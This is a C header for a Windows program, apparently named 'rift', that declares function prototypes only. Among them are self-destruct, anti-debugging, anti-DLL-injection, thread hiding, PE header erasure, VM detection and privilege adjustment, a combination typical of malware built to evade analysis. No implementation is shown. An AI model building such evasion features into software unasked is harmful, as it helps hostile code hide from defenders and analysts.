#pragma once
#include "_rift_shared.h"
#include "resource.h"
#pragma comment(linker, "\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

/* WinMain : main.c */
VOID ESelfDestruct();

/* Xoshiro PRNG Algorithm : Xoshiro.c */
BOOL EXoshiroBegin();
VOID EXoshiroEnd();

DWORD EXoshiroSS(_In_opt_ PDWORD dwa4);
DWORD EXoshiroP(_In_opt_ PDWORD dwa4);
UINT FASTCALL ERandomIntDistribution(_In_opt_ PDWORD dwa4, _In_ UINT uiMin, _In_ UINT uiMax);
FLOAT ERandomRealDistribution(_In_opt_ PDWORD dwa4);

/* Anti-ReverseEngineering : AntiDebug.c, AnitDllInject.c, AntiRE.c */
BOOL fnAntiRE();
BOOL IAntiDebug();
BOOL IAntiDllInject();
BOOL EHideThread(_In_opt_ HANDLE hThread);
extern FORCEINLINE BOOL IHashCodeSection();
BOOL fnErasePeHeader();

/* VMDetection : VMDetect.c */
BOOL ICheckVmPresent();

/* ConsoleHost : Console.c */
BOOL IOpenConsole();

/* NT Functions : NT.c */
BOOL EAdjustPrivilege(_In_ PCWSTR lpszPrivilege, _In_ BOOL bEnablePrivilege);

/* FileSystem Tools : FileSytsem.c */
PVOID AllocReadFileW(_In_ PCWSTR szFileName, _Out_ PSIZE_T nFileSize);
BOOL WriteFileCW(_In_ PCWSTR pFileName, _In_ PVOID pBuffer, _In_ SIZE_T nBuffer);
PCWSTR GetFileNameFromPathW(_In_ PCWSTR pPath);

/* Random : Random.c */
VOID EGenRandomB64W(_Out_ PVOID sz, _In_ SIZE_T n);
VOID EGenRandomPathW(_Out_ PVOID sz, _In_ SIZE_T n);
PCWSTR EAllocRandomBase64StringW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
PCWSTR EAllocRandomPathW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);

/* Utils and Other : Utils.c*/
BOOL IIsUserAdmin();
PVOID ELoadResourceW(_In_ WORD wResID, _In_ PCWSTR pResType, _Out_ PSIZE_T nBufferSize);